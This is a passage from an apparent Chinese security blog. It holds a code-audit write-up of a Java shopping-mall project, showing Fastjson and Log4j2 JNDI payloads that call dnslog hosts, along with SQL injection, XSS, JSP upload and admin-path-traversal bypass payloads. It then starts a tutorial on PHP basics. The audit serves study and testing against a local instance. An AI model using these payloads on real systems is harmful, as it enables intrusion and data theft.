<code>/tmall/orderItem</code> &#x3D;&gt; <code>PUT</code> &#x3D;&gt; <code>orderItemMap</code></li></ul></li></ul><p>添加产品信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022108955.png" alt="image-20230902210809831"></p><p>发现 <code>propertyJson</code> 参数：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022109806.png" alt="image-20230902210921657"></p><p>使用 <code>dnslog</code> 验证，<code>payload</code>：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;hc0v6w.dnslog.cn&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022111988.png" alt="image-20230902211147835"></p><p>漏洞存在：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022112003.png" alt="image-20230902211204871"></p><p>更新产品信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022114306.png" alt="image-20230902211417064"></p><p>数据包正确，发现参数：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022114005.png" alt="image-20230902211443858"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022118449.png" alt="image-20230902211833299"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022118378.png" alt="image-20230902211818246"></p><p>前台：</p><p>找不到功能点，直接构造数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/tmall/orderItem</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=3BF1BF6508DF4EEE6A2C6524078CA0F4<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><br><span class="language-ini"><span class="hljs-attr">orderItemMap</span>=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;pfen16.dnslog.cn&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022128021.png" alt="image-20230902212815869"></p><p>漏洞存在：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022128089.png" alt="image-20230902212825959"></p><h3 id="Log4j2-JNDI-注入"><a href="#Log4j2-JNDI-注入" class="headerlink" title="Log4j2 JNDI 注入"></a>Log4j2 JNDI 注入</h3><h4 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>全局搜索关键字 <code>logger</code>，看是否存在可控变量：</p><p>发现大部分是被强制转换为 <code>Integer</code>，这种是不行的，当传入 <code>payload</code> 后，它会尝试强制转换为 <code>int</code> 类型，无法转换就会报错，也不会执行 <code>logger.info</code>。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022136894.png" alt="image-20230902213619792"></p><p>在 <code>ForeProductListController.java</code> 的 <code>goToPage</code> 方法中 <code>product_name</code> 可控：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022140034.png" alt="image-20230902214050983"></p><p>这里按照空格分割，然后再去拼接为字符串，我们的 <code>payload</code> 没有空格，没影响。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022141575.png" alt="image-20230902214134547"></p><p>看一下前面的判断：</p><p>2 个参数不能为空，空的话就会跳转页面：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022239437.png" alt="image-20230902223950295"></p><p>接着看下一个：</p><p><code>ForeUserController.java</code> 中的 <code>uploadUserHeadImage</code> 方法 <code>file</code> 可控：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022145943.png" alt="image-20230902214525806"></p><p>下面还有一个 <code>filePath</code>，但它经过前面的路径拼接，可能无法正常执行 <code>payload</code>。</p><h4 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//krc3sl.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure><p>信息整理：</p><ul><li>转到前台天猫-产品搜索列表页 &#x3D;&gt; <code>/tmall/product</code> &#x3D;&gt; <code>GET</code> &#x3D;&gt; <code>product_name</code></li><li>前台天猫-用户更换头像 &#x3D;&gt; <code>/tmall/user/uploadUserHeadImage</code> &#x3D;&gt; <code>POST</code> &#x3D;&gt; <code>file</code> &#x3D;&gt;</li></ul><p>转到前台这里找不到功能点，构造数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tmall/product?category_id=1&amp;product_name=%24%7Bjndi:ldap://krc3sl.dnslog.cn%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=3BF1BF6508DF4EEE6A2C6524078CA0F4<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure><p>这里同样的 <code>payload</code> 发了好几次才成功：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022227053.png" alt="image-20230902222732887"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022228131.png" alt="image-20230902222800084"></p><p>前台头像上传，还是找不到，直接构造 数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tmall/user/uploadUserHeadImage</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------429435680220824472444017404385<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>246<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/tmall/admin<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>username=1209577113; JSESSIONID=3BF1BF6508DF4EEE6A2C6524078CA0F4<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------429435680220824472444017404385</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;$&#123;jndi:ldap://iryvyn.dnslog.cn&#125;&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">塒NG</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------429435680220824472444017404385--</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022234927.png" alt="image-20230902223425776"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022234713.png" alt="image-20230902223438581"></p><h3 id="MyBatis远程代码执行"><a href="#MyBatis远程代码执行" class="headerlink" title="MyBatis远程代码执行"></a>MyBatis远程代码执行</h3><p>漏洞编号：CVE-2020-26945</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022245833.png" alt="image-20230902224536805"></p><p>二级缓存这里需要这样开启：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;cacheEnabled&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br></code></pre></td></tr></table></figure><p>搜了一下，这里没有启用，所有不存在漏洞。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022247018.png" alt="image-20230902224751969"></p><h2 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h2><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><h4 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>该项目使用了 <code>MyBatis</code> 来执行 SQL 语句，那么当使用 <code>$&#123;&#125;</code> 来获取参数时，就可能存在注入。</p><p>搜索一下，有不少，挑一个看看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ORDER BY $&#123;orderUtil.orderBy&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022251535.png" alt="image-20230902225145426"></p><p>这里使用 idea 的 <code>Free MyBatis tools</code> 插件来直接定位到方法位置。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022253495.png" alt="image-20230902225349336"></p><p><code>Ctrl + Shift + H</code> &#x3D;&gt; 查看层次结构</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022300439.png" alt="image-20230902230018390"></p><p>虽然有 3 个方法都调用了，但是只有 <code>getRewardBySearch</code> 方法中的 <code>orderUtil.orderBy</code> 是可控的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022304127.png" alt="image-20230902230416966"></p><p>也没啥过滤代码，那就应该是有漏洞的。</p><h4 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>功能：按条件查询产品</p><p>路由：<code>/tmall/admin/reward/&#123;&#123;index&#125;&#125;/&#123;&#123;count&#125;&#125;</code></p><p>请求方法：<code>GET</code></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022308766.png" alt="image-20230902230800620"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022341458.png" alt="image-20230902234112294"></p><p>上 <code>sqlmap</code> ：</p><p><code>orderBy</code> 参数添加 <code>*</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022341310.png" alt="image-20230902234135231"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022342554.png" alt="image-20230902234251483"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022346181.png" alt="image-20230902234647022"></p><h3 id="XSS-跨站"><a href="#XSS-跨站" class="headerlink" title="XSS 跨站"></a>XSS 跨站</h3><h4 id="漏洞发现-3"><a href="#漏洞发现-3" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>XSS 这里一般是通过 Fliter 进行过滤，不过这个项目没有关于 XSS 的过滤器。且该项目前端使用的是纯 jsp ，并无框架，那就不存在 XSS 防护机制。</p><h4 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>搜索框处，发现输入值回显：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031130633.png" alt="image-20230903112956404"></p><p>构造 <code>payload</code>：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">product_name=&lt;/title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>product_name=<span class="hljs-string">&quot;+onclick%3D&quot;</span>alert(<span class="hljs-meta">%2Fxss</span><span class="hljs-meta">%2F</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031236341.png" alt="image-20230903123536672"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="漏洞发现-4"><a href="#漏洞发现-4" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>前台登录后有头像上传的地方：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031250116.png" alt="image-20230903125001824"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031251267.png" alt="image-20230903125107135"></p><p>点击上传个图片，抓包找方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031251965.png" alt="image-20230903125149815"></p><p>获取文件名、后缀，然后生成随机文件名再拼接后缀，没有过滤后缀的代码，存在漏洞。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031256171.png" alt="image-20230903125646071"></p><p>在 <code>pom.xml</code> 中有引入 <code>tomcat-embed-jasper</code>，可以解析 <code>jsp</code>。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里有一个前端验证，该个名字，上传后再修改会 <code>jsp</code> 即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031302645.png" alt="image-20230903130225486"></p><p>没有返回路径，但是下个数据包就是请求头像：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031304060.png" alt="image-20230903130401905"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031305276.png" alt="image-20230903130513137"></p><h3 id="权限校验绕过"><a href="#权限校验绕过" class="headerlink" title="权限校验绕过"></a>权限校验绕过</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在后台权限过滤器 <code>AdminPermissionFilter </code>中，在访问后台时，如果路径中存在 <code>/admin/login、/admin/account</code> 就直接放行了：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031312556.png" alt="image-20230903131256482"></p><p>全局搜索发现没有 <code>../</code> 的过滤：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031314952.png" alt="image-20230903131410917"></p><p>那么就可以构造如 <code>admin/login/../</code> 的 <code>payload</code> 来绕过 <code>fliter</code> 的校验。</p><p>翻了一下 <code>admin</code> 的 <code>Controller</code>，发现在里面就没有二次的身份校验，基本都是这样：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031322533.png" alt="image-20230903132207449"></p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/tmall/</span>admin<span class="hljs-regexp">/login/</span>../order<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031323576.png" alt="image-20230903132301418"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计</title>
    <link href="/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$colors</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;yellow&quot;</span>);<span class="hljs-comment"># 数值数组</span><br><span class="hljs-variable">$age</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>, <span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>, <span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<span class="hljs-comment"># 关联数组:键值对</span><br></code></pre></td></tr></table></figure><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>foreach 循环只适用于数组，并用于遍历数组中的每个键&#x2F;值对。</p><p>foreach 遍历数值数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$colors</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;yellow&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$colors</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环遍历数组 $colors，将其每个元素赋值给 $value；之后将其输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">red<br>green<br>blue<br>yellow<br></code></pre></td></tr></table></figure><p>foreach 遍历关联数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$age</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$age</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$x_value</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Key=&quot;</span> . <span class="hljs-variable">$x</span> . <span class="hljs-string">&quot;, Value=&quot;</span> . <span class="hljs-variable">$x_value</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">Key</span>=Peter, <span class="hljs-attribute">Value</span>=35<br><span class="hljs-attribute">Key</span>=Ben, <span class="hljs-attribute">Value</span>=37<br><span class="hljs-attribute">Key</span>=Joe, <span class="hljs-attribute">Value</span>=43<br></code></pre></td></tr></table></figure><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>比如：</p><ul><li>数组：array(“Name”&#x3D;&gt;”fuming”)，使用 extract() 函数导入后就生成了 $Name &#x3D; “fuming”</li></ul><p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p><p>该函数返回成功导入到符号表中的变量数目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-keyword">array</span>,extract_rules,prefix)<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309032237129.png" alt="image-20221107221138978"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$a</span> = <span class="hljs-built_in">Cat</span>; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse<br></code></pre></td></tr></table></figure><h3 id="parse-str函数"><a href="#parse-str函数" class="headerlink" title="parse_str函数"></a>parse_str函数</h3><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-keyword">string</span>,<span class="hljs-keyword">array</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要解析的字符串。</td></tr><tr><td align="left"><em>array</em></td><td align="left">可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Peter&amp;age=43&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Peter</span><br><span class="hljs-number">43</span><br></code></pre></td></tr></table></figure><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;&gt;<span class="hljs-comment"># 不等于</span><br><span class="hljs-number">5</span>&lt;&gt;<span class="hljs-number">8</span><span class="hljs-comment"># 5不等于8,返回true</span><br></code></pre></td></tr></table></figure><h3 id="GLOBALS超全局变量组"><a 